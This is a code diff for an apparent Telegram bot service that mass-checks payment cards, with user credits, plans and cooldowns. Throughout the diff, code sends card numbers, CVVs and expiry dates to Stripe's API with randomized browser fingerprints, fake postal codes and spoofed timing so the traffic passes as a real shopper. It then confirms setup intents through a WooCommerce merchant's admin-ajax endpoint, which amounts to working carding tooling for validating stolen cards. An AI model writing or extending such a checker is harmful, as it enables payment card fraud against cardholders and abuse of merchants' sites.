@@ -13,11 +13,11 @@ from pyrogram.types import Message
 import logging
 import httpx
 
-# Import from main stauth module
+# CORRECTED IMPORTS
 from BOT.gates.auth.stripe.stauth import StripeAuthChecker, logger, load_users, is_user_banned, check_cooldown, get_user_plan
 from BOT.helper.permissions import auth_and_free_restricted
 from BOT.helper.Admins import is_command_disabled, get_command_offline_message
-from BOT.gc.credits import update_user_credits
+from BOT.gc.credit import update_user_credits  # Fixed: credit.py (singular)
 
 class MassStripeAuthChecker:
     def __init__(self):
@@ -114,8 +114,7 @@ class MassStripeAuthChecker:
                 )
         
         try:
-            # Import the check_card_with_session method from the checker
-            # Since stauth.py doesn't have it, we'll create a modified version here
+            # Check card with existing session
             result = await self.check_card_with_existing_session(card_details, username, user_data)
             
             # If successful, increment session card count
@@ -149,13 +148,17 @@ class MassStripeAuthChecker:
             else:
                 # Not a rate limit error or max retries exceeded
                 self.retry_count = 0
+                # Parse card details for error response
+                cc, mes, ano, cvv = self.parse_card_details(card_details)
+                bin_info = await self.checker.get_bin_info(cc)
                 return await self.checker.format_response(
-                    *self.parse_card_details(card_details), 
+                    cc, mes, ano, cvv, 
                     "ERROR", 
                     error_str[:80], 
                     username, 
                     0, 
-                    user_data
+                    user_data,
+                    bin_info
                 )
     
     async def check_card_with_existing_session(self, card_details, username, user_data):
@@ -169,9 +172,51 @@ class MassStripeAuthChecker:
             # Get BIN info
             bin_info = await self.checker.get_bin_info(cc)
             
+            # Generate random browser fingerprints
+            client_session_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=36))
+            guid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)) + ''.join(random.choices(string.digits, k=5))
+            muid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)) + ''.join(random.choices(string.digits, k=5))
+            sid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)) + ''.join(random.choices(string.digits, k=5))
+            
             # Create Stripe payment method using existing session
-            stripe_data = self.prepare_stripe_data(cc, mes, ano, cvv)
-            stripe_headers = self.get_stripe_headers()
+            stripe_data = {
+                'type': 'card',
+                'card[number]': cc,
+                'card[cvc]': cvv,
+                'card[exp_year]': ano,
+                'card[exp_month]': mes,
+                'allow_redisplay': 'unspecified',
+                'billing_details[address][postal_code]': random.choice(['10080', '90210', '33101', '60601']),
+                'billing_details[address][country]': 'US',
+                'pasted_fields': 'number',
+                'payment_user_agent': f'stripe.js/{random.choice(["065b474d33", "8e9b241db6"])}; stripe-js-v3/{random.choice(["065b474d33", "8e9b241db6"])}; payment-element; deferred-intent',
+                'referrer': self.checker.base_url,
+                'time_on_page': str(random.randint(30000, 120000)),
+                'client_attribution_metadata[client_session_id]': client_session_id,
+                'client_attribution_metadata[merchant_integration_source]': 'elements',
+                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
+                'client_attribution_metadata[merchant_integration_version]': str(random.randint(2021, 2024)),
+                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
+                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
+                'guid': guid,
+                'muid': muid,
+                'sid': sid,
+                'key': self.checker.stripe_key,
+                '_stripe_version': '2024-06-20'
+            }
+            
+            stripe_headers = {
+                'authority': 'api.stripe.com',
+                'accept': 'application/json',
+                'accept-language': 'en-US,en;q=0.9',
+                'content-type': 'application/x-www-form-urlencoded',
+                'origin': 'https://js.stripe.com',
+                'referer': 'https://js.stripe.com/',
+                'user-agent': self.checker.user_agent,
+                'sec-ch-ua': self.checker.sec_ch_ua,
+                'sec-ch-ua-mobile': self.checker.sec_ch_ua_mobile,
+                'sec-ch-ua-platform': self.checker.sec_ch_ua_platform
+            }
             
             stripe_response = await self.current_client.post(
                 "https://api.stripe.com/v1/payment_methods", 
@@ -204,7 +249,24 @@ class MassStripeAuthChecker:
                 )
             
             # Confirm setup intent via AJAX
-            ajax_response = await self.confirm_setup_intent(payment_method_id)
+            ajax_url = f"{self.checker.base_url}/wp-admin/admin-ajax.php"
+            ajax_headers = self.checker.get_base_headers()
+            ajax_headers.update({
+                'Accept': 'application/json, text/javascript, */*; q=0.01',
+                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                'Origin': self.checker.base_url,
+                'Referer': f"{self.checker.base_url}/my-account-2/add-payment-method/",
+                'X-Requested-With': 'XMLHttpRequest',
+            })
+            
+            ajax_data = {
+                'action': 'wc_stripe_create_and_confirm_setup_intent',
+                'wc-stripe-payment-method': payment_method_id,
+                'wc-stripe-payment-type': 'card',
+                '_ajax_nonce': self.current_nonce
+            }
+            
+            ajax_response = await self.current_client.post(ajax_url, headers=ajax_headers, data=ajax_data)
             
             if ajax_response.status_code != 200:
                 return await self.checker.format_response(
@@ -276,77 +338,6 @@ class MassStripeAuthChecker:
             return cc, mes, ano, cvv
         except:
             return "", "", "", ""
-    
-    def prepare_stripe_data(self, cc, mes, ano, cvv):
-        """Prepare Stripe API data"""
-        import string
-        
-        client_session_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=36))
-        guid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)) + ''.join(random.choices(string.digits, k=5))
-        muid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)) + ''.join(random.choices(string.digits, k=5))
-        sid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)) + ''.join(random.choices(string.digits, k=5))
-        
-        return {
-            'type': 'card',
-            'card[number]': cc,
-            'card[cvc]': cvv,
-            'card[exp_year]': ano,
-            'card[exp_month]': mes,
-            'allow_redisplay': 'unspecified',
-            'billing_details[address][postal_code]': random.choice(['10080', '90210', '33101', '60601']),
-            'billing_details[address][country]': 'US',
-            'pasted_fields': 'number',
-            'payment_user_agent': f'stripe.js/{random.choice(["065b474d33", "8e9b241db6"])}; stripe-js-v3/{random.choice(["065b474d33", "8e9b241db6"])}; payment-element; deferred-intent',
-            'referrer': self.checker.base_url,
-            'time_on_page': str(random.randint(30000, 120000)),
-            'client_attribution_metadata[client_session_id]': client_session_id,
-            'client_attribution_metadata[merchant_integration_source]': 'elements',
-            'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
-            'client_attribution_metadata[merchant_integration_version]': str(random.randint(2021, 2024)),
-            'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
-            'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
-            'guid': guid,
-            'muid': muid,
-            'sid': sid,
-            'key': self.checker.stripe_key,
-            '_stripe_version': '2024-06-20'
-        }
-    
-    def get_stripe_headers(self):
-        """Get Stripe API headers"""
-        return {
-            'authority': 'api.stripe.com',
-            'accept': 'application/json',
-            'accept-language': 'en-US,en;q=0.9',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://js.stripe.com',
-            'referer': 'https://js.stripe.com/',
-            'user-agent': self.checker.user_agent,
-            'sec-ch-ua': self.checker.sec_ch_ua,
-            'sec-ch-ua-mobile': self.checker.sec_ch_ua_mobile,
-            'sec-ch-ua-platform': self.checker.sec_ch_ua_platform
-        }
-    
-    async def confirm_setup_intent(self, payment_method_id):
-        """Confirm setup intent via AJAX"""
-        ajax_url = f"{self.checker.base_url}/wp-admin/admin-ajax.php"
-        ajax_headers = self.checker.get_base_headers()
-        ajax_headers.update({
-            'Accept': 'application/json, text/javascript, */*; q=0.01',
-            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            'Origin': self.checker.base_url,
-            'Referer': f"{self.checker.base_url}/my-account-2/add-payment-method/",
-            'X-Requested-With': 'XMLHttpRequest',
-        })
-        
-        ajax_data = {
-            'action': 'wc_stripe_create_and_confirm_setup_intent',
-            'wc-stripe-payment-method': payment_method_id,
-            'wc-stripe-payment-type': 'card',
-            '_ajax_nonce': self.current_nonce
-        }
-        
-        return await self.current_client.post(ajax_url, headers=ajax_headers, data=ajax_data)
     
     async def format_mass_response(self, results, successful, failed, total_cards, username, elapsed_time, user_data):
         """Format the mass check results with proper UI"""
